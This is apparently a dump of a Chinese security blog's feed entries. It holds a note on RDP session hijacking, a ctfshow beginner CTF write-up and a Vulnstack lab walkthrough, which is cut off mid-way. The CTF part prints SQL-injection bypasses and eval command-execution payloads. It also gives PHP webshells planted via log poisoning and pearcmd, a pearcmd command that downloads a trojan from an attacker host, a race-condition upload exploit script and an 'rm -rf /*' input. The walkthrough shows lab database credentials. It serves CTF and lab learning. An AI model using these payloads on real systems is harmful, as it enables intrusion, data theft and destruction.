id="RDP劫持"><a class="header-anchor" href="#RDP劫持">¶</a>RDP劫持</h2><p>当管理员使用远程桌面连接到计算机并关闭RDP客户端而不是注销时,他的会话将无限期地在服务器上保持打开状态如果在Windows Server 2016及更早版本上拥有系统权限,则无需密码即可接管任何现有RDP会话</p><p>先用任何方法获取SYSTEM权限</p><p>列出服务器现有会话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;query user</span><br><span class="line"></span><br><span class="line">USERNAMESESSIONNAMEIDSTATE...</span><br><span class="line">user1          2Disc</span><br><span class="line">user2   rdp-tcp#18   3      Active</span><br><span class="line">user3    4  Disc</span><br><span class="line">user4    5  Disc</span><br></pre></td></tr></table></figure><p>如果要移动到 t1_body.beck 用户会话，可以使用以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tscon 5 /dest:rdp-tcp#18</span><br><span class="line">// 5 对应着该用户的ID  rdp-tcp#18为自己SESSIONNAME</span><br></pre></td></tr></table></figure><p>执行whoami验证即可</p>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> msf </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_萌新</title>
      <link href="/article/ctfshow-mengxin/"/>
      <url>/article/ctfshow-mengxin/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>部分题目由于自己也没有搞懂于是直接开抄, 请见谅</p></blockquote><h1>Web</h1><hr><h2 id="Web1"><a class="header-anchor" href="#Web1">¶</a>Web1</h2><p>核心代码如下, 绕过正则即可, 或者sql注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"> <span class="comment"># 判断id的值是否大于999</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);<span class="comment"># 执行sql 语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能绕过的手段包括:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=~~1000# 逻辑非</span><br><span class="line">?id=0000|1000# 逻辑或</span><br><span class="line">?id=&#x27;1000&#x27;# 字符串 </span><br><span class="line">?id=2 or id=1000# 拼接语句(管道符)</span><br><span class="line">?id=!!1000# 感叹号</span><br><span class="line">?id=0b001111101000# 二进制转换</span><br><span class="line">?id=round(999.9)# PHP四舍五入</span><br><span class="line">?id=8*125# 数学运算</span><br><span class="line">?id=power(10,3)# power函数</span><br><span class="line">?id=500 div 0.5# sql的除号</span><br><span class="line">?id=&#x27;1e3&#x27;# 科学记数法</span><br><span class="line">?id=/**/1000# 注释</span><br><span class="line">?id=/*!1000*/# 内联注释</span><br><span class="line">?id=125&lt;&lt;3# 左右移</span><br><span class="line">?id=0x3E8# intval()函数利用</span><br><span class="line">?id=2 union select * from article where id=1000# 直接sql注入</span><br><span class="line">?id=CAST(0x339 AS INT)# sql认为的1000, PHP不一定认.可以使用sql的十六进制的1000</span><br></pre></td></tr></table></figure><blockquote><p>intval()函数的第二个参数默认为10, 即只要遇到非数字转换就会暂停</p></blockquote><h2 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h2><p>核心代码如下, 是eval类型的命令执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题eval命令执行, 绕过方式:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;cat config.php&#x27;);# 替换命令</span><br><span class="line">?c=echo `tac config.php`;# 反引号命令执行</span><br><span class="line">?c=show_source(&#x27;config.php&#x27;);# php函数命令执行</span><br><span class="line">?c=echo file_get_contents(&#x27;config.php&#x27;);# 同上</span><br><span class="line">?c=readfile(&quot;config.php&quot;);# 同上</span><br><span class="line">?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);# 拼接</span><br><span class="line">?c=echo `$_GET[1]`;&amp;1=tac config.php# GET方法</span><br><span class="line">?c=echo `$_POST[1]`;然后在post data中写入1=tac config.php# POST方法</span><br><span class="line">?c=print_r(get_defined_vars()); # 在数组中取出当前已定义的变量</span><br><span class="line">?c=include(&#x27;php://filter/read=convert.base64-encode/resource=config.php&#x27;);</span><br><span class="line"># 变成命令执行再利用伪协议</span><br><span class="line">?c=$a=base64_decode(&#x27;c3lzdGVt&#x27;);$b=base64_decode(&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;);$a($b);# 编码绕过</span><br><span class="line">?c=echo `tac conf*`;# 通配符</span><br><span class="line">?c=passthru(&#x27;tac conf?g?p?p&#x27;);# 同上</span><br><span class="line">?c=echo tac confi[g][!0-9]ph[p];# 同上</span><br><span class="line">?c=echo `tac conf\ig*`;# 利用\隔开</span><br><span class="line">?c=echo $flag?&gt;# 解了那么多次发现输出是$flag,那就试试直接输出它</span><br></pre></td></tr></table></figure><p><code>print_r(getenv());</code>可以输出当前的环境变量, 可能会有用, 反正这题没用</p><p>再给出一些可供替换的函数/命令/符号:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行: system(),exec(),passthru(),shell_exec(),proc_open()和popen()</span><br><span class="line">查看文件: cat,tac,more,head,tail,</span><br><span class="line">分号过滤: ?&gt;闭合开头后,最后一行可以不用分号</span><br><span class="line"></span><br><span class="line"># 对于popen()</span><br><span class="line">&lt;?php</span><br><span class="line">$handle = popen(&#x27;/bin/ls&#x27;, &#x27;r&#x27;);</span><br><span class="line">echo &quot;&#x27;$handle&#x27;; &quot; . gettype($handle) . &quot;\n&quot;;</span><br><span class="line">pclose($handle);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="Web17"><a class="header-anchor" href="#Web17">¶</a>Web17</h2><p>核心代码如下, 是文件包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以nginx日志包含:</p><ol><li>访问/var/log/nginx/access.log</li><li>在user-agent写入一句话木马<code>&lt;?php @eval($_POST['2333']); ?&gt;</code></li><li>蚁剑连接即可</li></ol><h2 id="Web22"><a class="header-anchor" href="#Web22">¶</a>Web22</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\:|\/|\\\/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先介绍pearpear是一个是可重用的PHP组件框架和系统分发在pear中有一个pearcmd.php的类, 可以用+拼接命令, 例如从攻击机下载木马<code>pearcmd&amp;+download+http://xxxxx/index.php</code></p><p>还有直接写shell:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;c=pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/var/www/html/test.php  </span><br><span class="line"># 在/var/www/html下写入webshell</span><br></pre></td></tr></table></figure><p>然后可以POST <code>cmd=system(&quot;tac 36d.php&quot;);</code></p><h2 id="获得百分百的快乐"><a class="header-anchor" href="#获得百分百的快乐">¶</a>获得百分百的快乐</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完全是通配符的利用,毕竟传入要求小于4, 完整使用方法可以看<a href="https://www.anquanke.com/post/id/87203">博客</a></p><p>根据这个文章,我们只需要执行下面两个命令就能解决这个题目, 在F12就能拿到结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;nl# 创建叫做nl的文件</span><br><span class="line">&gt;*# 以第一个文件名为命令去执行</span><br></pre></td></tr></table></figure><h2 id="Web23"><a class="header-anchor" href="#Web23">¶</a>Web23</h2><p>乍看是文件上传,但是上传后却访问不到任何东西, 非常的神奇然后发现上传得到的文件是按照当前时间重新命名的,这可不行既然是重命名,那么就可以使用条件竞争策略进行爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Auth: y2hlbmc</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://7dbded2a-12d4-4d3a-a8c5-ddc6d8e78d74.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Thread</span>(<span class="params">fun,*args</span>):</span><br><span class="line">    <span class="keyword">return</span> threading.Thread(target=fun, args=args)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">fname</span>):</span><br><span class="line">    r = requests.get(url + <span class="string">&quot;uploads/&quot;</span> + fname + <span class="string">&quot;.php&quot;</span>)</span><br><span class="line">    x = r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&quot;404 Not Found&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">&quot;容器已过期&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Thread_start</span>(<span class="params">fname</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">400</span>):</span><br><span class="line">        <span class="comment"># 每个文件名单起一个线程</span></span><br><span class="line">        Thread(req, fname + <span class="built_in">str</span>(i)).start()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_data = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&quot;&lt;?php system(\&quot;tac ../flaghere0.txt\&quot;);?&gt;&quot;</span>.encode())&#125;</span><br><span class="line">        r = requests.post(url + <span class="string">&quot;upload.php&quot;</span>,files=file_data)</span><br><span class="line">        txt = r.text</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uploaded:&quot;</span>,txt)</span><br><span class="line">        <span class="comment"># 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔</span></span><br><span class="line">        ts = <span class="built_in">int</span>(time.mktime(time.strptime(txt[<span class="number">8</span>:<span class="number">22</span>], <span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)))</span><br><span class="line">        fname = time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>, time.localtime(ts + <span class="number">1</span>))</span><br><span class="line">        <span class="comment"># 单起一个线程，爆破下一次upload的文件名</span></span><br><span class="line">        Thread(Thread_start, fname).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure><p>嫖来的源码:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$new_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>,<span class="title function_ invoke__">time</span>()).<span class="title function_ invoke__">rand</span>(<span class="number">100</span>,<span class="number">1000</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext_suffix</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;uploads/&#x27;</span>.<span class="variable">$new_filename</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;uploads/<span class="subst">$new_filename</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf ./uploads/*.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>嫖来的<a href="https://wp.ctf.show/d/131-23-24">出处</a></p><h1>MISC</h1><hr><h2 id="杂项6"><a class="header-anchor" href="#杂项6">¶</a>杂项6</h2><p>是伪加密, 没有密码</p><p><strong>原理:</strong> 压缩包开头有一些固定的格式:</p><ol><li>压缩源文件数据区：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4B 03 04# 这是头文件标记  （0x04034b50）</span><br><span class="line">14 00# 解压文件所需 pkware 版本</span><br><span class="line">00 00# 全局方式位标记（判断有无加密）</span><br><span class="line">08 00# 压缩方式</span><br><span class="line">DC 01# 最后修改文件时间</span><br><span class="line">53 50# 最后修改文件日期</span><br></pre></td></tr></table></figure><ol start="2"><li>压缩源文件目录区：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4B 01 02# 目录中文件文件头标记  （0x02014b50）</span><br><span class="line">1F 00# 压缩使用的 pkware 版本</span><br><span class="line">14 00# 解压文件所需 pkware 版本</span><br><span class="line">00 00# 全局方式位标记（判断是否为伪加密）</span><br><span class="line">08 00# 压缩方式</span><br><span class="line">DC 01# 最后修改文件时间</span><br><span class="line">53 50# 最后修改文件日期</span><br></pre></td></tr></table></figure><ol start="3"><li>压缩源文件目录结束标志：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4B 05 06# 目录结束标记</span><br><span class="line">00 00# 当前磁盘编号</span><br><span class="line">00 00# 目录区开始磁盘编号</span><br><span class="line">01 00# 本磁盘上纪录总数</span><br><span class="line">01 00# 目录区中纪录总数</span><br><span class="line">5A 00 00 00# 目录区尺寸大小</span><br><span class="line">3B 00 00 00# 目录区对第一张磁盘的偏移量</span><br><span class="line">00 00# ZIP 文件注释长度</span><br></pre></td></tr></table></figure><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性第二个数字为奇数时 –&gt; 加密第二个数字为偶数时 –&gt; 未加密一般无加密的时候数字应该都是<code>00 00</code>, 而有加密的应该都是<code>09 00</code>, 伪加密则是只有第二个是<code>09 00</code></p><p>本题文件16进制如下, 已经划分好标志了, 可以看出是伪加密, 将其修改为<code>00 00</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240622104904527.png" alt="image-20240622104904527"></p><h2 id="杂项7-8"><a class="header-anchor" href="#杂项7-8">¶</a>杂项7,8</h2><p>类似, 就放在一起了</p><p>根据题目的提示, 是修改宽和高, 十六进制中宽高位置如下:修改的时候我们一般是最高位加一或者减一, 可以直接拿到答案</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240622110948116.png" alt="image-20240622110948116"></p><p>对于一些工具, 通用方法是CRC校验和来爆破宽和高</p><h2 id="杂项11"><a class="header-anchor" href="#杂项11">¶</a>杂项11</h2><p>jpeg图片信息隐藏:利用jphs提取(seek)出txt文件, winhex发现似乎是png文件头, 修改后得到二维码扫码得到url, url后面是一串base64编码,解码得到flag<code>flag&#123;战神归来发现自己儿子在刷题，一怒之下召唤10万将士来报仇&#125;</code></p><h2 id="萌新-隐写6"><a class="header-anchor" href="#萌新-隐写6">¶</a>萌新 隐写6</h2><p>audacity打开文件后在音轨上找到类似摩斯电码的音频长的为<code>-</code>, 比较短的为<code>.</code>, 间隔比较长的是分隔符<code>/</code>,然后解码即可–/…-/–…/…/-.-/…/…/–./-----/-----/-…得到: MUZIKISG00D</p><h1>Crypto</h1><h2 id="萌新-密码1"><a class="header-anchor" href="#萌新-密码1">¶</a>萌新_密码1</h2><p>web偶尔用一下, 浅学一点</p><p>看到存在6C、6B、而且由予没有出现G及其以后的推测为16进制加密，尝试使用HEX16解密，得到S1lkZjBhM2ViZDVjNGRjMTYwLUV7ZmI2M2VlMDI5OGI4ZjRkOH0=看到了文末的=下意识认为是base64加密，尝试使用base64进行解密，得到结果为：KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}存在KEY{} 字符, 符合栅栏加密的方式, 于是尝试解密, 得到结果为： KEY{dffb06a33eeeb0d259c84bd8cf146d08-}</p><h1>价值不多</h1><h2 id="Web"><a class="header-anchor" href="#Web">¶</a>Web</h2><hr><h3 id="Web2-7"><a class="header-anchor" href="#Web2-7">¶</a>Web2-7</h3><p>都是和Web1一样的过滤:Web2新增<code>or</code>Web3新增<code>- \\ * &lt; &gt; ! x hex +</code>Web4新增<code>\ / &lt; &gt; ! ( ) select</code>Web5新增<code>' &quot; |</code>Web6新增<code>^</code>Web7新增<code>~</code></p><h3 id="Web8"><a class="header-anchor" href="#Web8">¶</a>Web8</h3><p>告诉你了是程序猿跑了, 那就是删库跑路<code>?flag=rm -rf /*</code></p><h3 id="Web9"><a class="header-anchor" href="#Web9">¶</a>Web9</h3><p>压根没过滤, 甚至是指定命令执行,原因是正则表达式前面忘记加上<code>!</code><code>?c=system('cat config.php');</code></p><h3 id="Web11-15"><a class="header-anchor" href="#Web11-15">¶</a>Web11-15</h3><p>过滤新增:Web11新增 <code>cat</code>Web12新增 <code>config . php config</code>Web13新增 <code>; file</code>Web14新增 <code>(</code>Web15新增 <code>* ? &lt; &gt; = </code>, 去除<code>;</code></p><h3 id="Web16"><a class="header-anchor" href="#Web16">¶</a>Web16</h3><p>爆破或者使用md5在线解密即可得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">payload=&#x27;&#x27;</span><br><span class="line">for i in str1:</span><br><span class="line">    for j in str1:</span><br><span class="line">        for k in str1:</span><br><span class="line">            s = hashlib.md5((&#x27;ctfshow&#x27;+i+j+k).encode()).hexdigest()</span><br><span class="line">            #print(type(s))</span><br><span class="line">            if s==&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure><h3 id="Web18"><a class="header-anchor" href="#Web18">¶</a>Web18</h3><p>过滤新增:Web18新增 <code>file</code>Web19新增 <code>base</code>Web20新增 <code>rot</code>Web21新增 <code>:</code></p><h3 id="Web24"><a class="header-anchor" href="#Web24">¶</a>Web24</h3><p>因为只需要把23的拿过来改成rand(0,300)和sleep(3)就可以了,就是那个(ts + 1)变成(ts + 3)</p><h2 id="Misc"><a class="header-anchor" href="#Misc">¶</a>Misc</h2><hr><h3 id="杂项"><a class="header-anchor" href="#杂项">¶</a>杂项</h3><p>杂项1: md5在线解码杂项2: winhex拉到底或者在stegsolve中analyse-&gt;file format杂项3: 看图写话971015杂项4: archpr爆破压缩包密码:372619038杂项5: 所有大写字母拿出来就是flag, FLAG{CTFSHOWNB}杂项10: 离远点眯眼, 能看出 我好喜欢你 (所以为什么没有9)</p><h3 id="隐写1"><a class="header-anchor" href="#隐写1">¶</a>隐写1</h3><p>隐写1: 打不开的png文件, winhex打开发现是文件头错了, 修改即可隐写2: jpeg隐写, 同杂项11萌新隐写5: 用winhex打开后提取有用字符然后base32解码(其实我用的cyberchef自动解码):MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE======</p><blockquote><p>特征似乎是字符全大写, 后5位=补齐</p></blockquote><h3 id="萌新-隐写2"><a class="header-anchor" href="#萌新-隐写2">¶</a>萌新 隐写2</h3><p>直接拿去爆破压缩包密码, 得到<code>19981000</code></p><h3 id="萌新-隐写4"><a class="header-anchor" href="#萌新-隐写4">¶</a>萌新 隐写4</h3><p>word选项-&gt;显示-&gt;隐藏文字</p><h3 id="萌新-隐写3"><a class="header-anchor" href="#萌新-隐写3">¶</a>萌新 隐写3</h3><p>就写在图片上</p><h2 id="Crypto"><a class="header-anchor" href="#Crypto">¶</a>Crypto</h2><hr><h3 id="萌新-密码2"><a class="header-anchor" href="#萌新-密码2">¶</a>萌新_密码2</h3><p>就是这几个字符在键盘上分别把<code>fwy</code>三个字母围了起来,加上KEY{}提交即可</p><h3 id="萌新-密码3"><a class="header-anchor" href="#萌新-密码3">¶</a>萌新 密码3</h3><p>首先是莫斯电码解码,这些斜杠解码后只是空格, 我直接去掉了, 得到如下字符串<code>MORSE_IS_COOL_BUT_BACON_IS_COOLER_MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</code>后面这里是bacon密码, 因为只识别AB,所以换成AB两个都试过了, <code>AABBABABAAABBBABABBAAAAAAABBABAABBA</code>靠谱, 解出来<code>guowang</code>要大写提交, 我不到啊</p><h3 id="萌新-密码-4"><a class="header-anchor" href="#萌新-密码-4">¶</a>萌新 密码#4</h3><p><code>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</code>CyberChef一把梭: base64+HTML Entity+base85</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstack-红日3</title>
      <link href="/article/vulnstack-3/"/>
      <url>/article/vulnstack-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>vulnstack红队3</h1><p>真诚地建议您, 当看见打开的虚拟机状态为挂起的时候,<strong>先拍摄快照</strong>再进行其他操作,如果您删除了域成员而没有删除域控,在你重新解压域成员的时候会告诉你不信任该域,这样你就只能重新解压全部了</p><blockquote><p>目标：域控中存在一份重要文件. 本次是黑盒渗透,所以没有账号密码</p><p>ubuntu显示的<code>ifconfig</code>太长了看不到?试试<code>ip addr</code>吧</p><p>要求还是web-centos可以ping通所有, 如果ping不通或者想要换个地址可以用<code>service network restart</code> 重启网卡以重新获取地址</p><p>我在执行上面的命令后发现虚拟机设置中的网络适配器可以调整了,而我的桥接模式用不了,我改成了NAT模式</p></blockquote><p>新增一个虚拟网络:192.168.93.0/24 内网环境(Vmnet2)</p><ul><li><p>kali192.168.204.132</p></li><li><p>web-centos192.168.204.131  外网地址192.168.93.100  内网地址</p></li><li><p>web1-ubantu(合理怀疑作者拼错了)</p><p>192.168.93.120</p></li><li><p>win2008192.168.93.20</p></li><li><p>pc192.168.93.30</p></li><li><p>Windows Server 2012192.168.93.10</p></li></ul><h2 id="外网渗透"><a class="header-anchor" href="#外网渗透">¶</a>外网渗透</h2><h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -Pn 192.168.204.0/24</span></span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.204.131</span><br><span class="line">Host is up (0.0016s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:32:46:C9 (VMware)</span><br></pre></td></tr></table></figure><blockquote><p>如果你是NAT模式,你可以直接利用物理机的浏览器访问网址用更多插件,这里就不叙述了</p></blockquote><p>访问可以看到博客界面,似乎没有进行任何更新,所以这个Joomla似乎就是博客的名称了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504164310488.png" alt="image-20240504164310488"></p><p>用dirsearch等工具扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.204.131 -i 200  // 仅输出响应200</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504170248889.png" alt="image-20240504170248889"></p><p>分别是后台地址,web配置文件, <code>1.php</code>甚至是一个phpinfo, <code>2.php</code>我猜大概是一句话木马, <code>robots.txt</code>也是给的后台地址</p><blockquote><p>configuration.php 文件通常用于存储和管理网站的关键设置。大多数基于PHP的网站或网页框架都使用这种形式的配置文件, 可能包含的一些内容：</p><ol><li>数据库连接信息：configuration.php 文件通常包含用来连接数据库的信息，如数据库服务器的地址、数据库的名字、用户名和密码等。</li><li>网站参数：这可能包括网站的URL、邮件服务设置、网站的语言设定、时间区域设置等。</li><li>错误报告级别：设定PHP应该报告何种级别的错误。</li><li>其他配置项：比如站点维护模式开关、缓存设置、文件上传的限制等。</li></ol></blockquote><p>发现有<code>disable_functions</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504181136000.png" alt="image-20240504181136000"></p><p>可惜后台爆破没结果, 还是看看远处的<code>configuration.php</code>和<code>configuration.php~</code>吧</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504171643213.png" alt="image-20240504171643213"></p><p>格式化之后好看一点, 只给出比较重要的部分</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$dbtype</span> = <span class="string">&#x27;mysqli&#x27;</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&#x27;testuser&#x27;</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;cvcvgjASD!@&#x27;</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$db</span> = <span class="string">&#x27;joomla&#x27;</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dbprefix</span> = <span class="string">&#x27;am2zu_&#x27;</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&#x27;gXN9Wbpk7ef3A4Ys&#x27;</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/html/tmp&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504172949333.png" alt="image-20240504172949333"></p><h3 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h3><p>正好 3306 端口开了,这里的账号密码拿去看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.204.131 -utestuser -p// 谁让密码有特殊符号不能简单登录呢</span><br><span class="line">Enter password :cvcvgjASD!@</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504173419865.png" alt="image-20240504173419865"></p><p>根据前面<code>configuration.php</code>的信息,我们逐个查找</p><figure class="highlight 